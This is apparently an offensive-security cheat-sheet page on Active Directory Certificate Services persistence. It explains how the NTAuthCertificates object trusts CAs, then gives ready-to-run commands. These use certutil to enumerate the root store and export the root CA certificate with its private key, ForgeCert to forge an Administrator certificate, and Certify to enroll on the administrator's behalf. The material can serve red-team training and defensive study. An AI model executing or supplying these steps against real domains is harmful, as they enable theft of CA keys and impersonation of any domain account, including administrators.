## Forge ANY domain certificate using stolen external Trusted Root certificate and private keys (added root/intermediate/NTAuthCAcertificates container) ##

#### What's running under the hood ####
- The object **NTAuthCertificates** defines one or more CA certificates in its `cacertificate` attribute.
- During authentication, the domain controller checks if **NTAuthCertificates** object contains an entry for the CA specified in the authenticating certificate’s Issuer field. If it is, authentication proceeds.

#### What the attack is about ####
- An attacker could generate a self-signed CA certificate and add it to the **NTAuthCertificates** object.
- Attackers can do this if they have control over the **NTAuthCertificates** AD object. With the elevated access, one can edit the NTAuthCertificates object from any system.
- This can be abused to forge certificates for any domain user using [[DPERSIST1]].
- One popular use of this attack is to abuse Trusting CA Certificates. Two forests can be configured to share the same CA for Cross Forest Certificate Enrollment using a bidirectional cross forest trust. In such a case the RootCA certificate is added to the target forest sharing the source forest CA.
- Only the RootCA certificate needs to added, but careless handling results in storing the RootCA along with the private key.

### Enumeration ###
1. **Certutil**
- Enumerate the CA/Root Stores for CA _RootCA_ certificates.
`PS C:\ADCS\Auditor> certutil -store -enterprise Root`

### Exploitation ####
- Steal the RootCA certificate.
`PS C:\ADCS\Auditor> certutil -exportpfx -p certpass -enterprise Root 51f5aa83c01b57b34635410a3738e79d C:\Windows\Tasks\RootCA.p12`

- Forge a certificate using **ForgeCert** for any domain user/computer.
`PS C:\ADCS\Auditor> C:\ADCS\Auditor\ForgeCert\ForgeCert.exe --CaCertPath "C:\Windows\Tasks\RootCA.p12" --CaCertPassword certpass --Subject "CN=Administrator,CN=Users,DC=cb,DC=corp" --SubjectAltName administrator@cb.corp --NewCertPath "C:\ADCS\Auditor\Loot\forged-ea.pfx" --NewCertPassword certpass`

- Enroll in a template like User or Administrator that permits Client Authentication.
`PS C:\ADCS\Auditor> C:\ADCS\Auditor\Certify.exe request /ca:cb-ca.cb.corp\CB-CA /template:User /onbehalfof:cb\administrator /enrollcert:"C:\ADCS\Auditor\Loot\\forged-ea.pfx" /enrollcertpw:certpass /domain:cb.corp /dc:cb-ca.cb.corp /sidextension:S-1-5-21-2928296033-1822922359-262865665-500`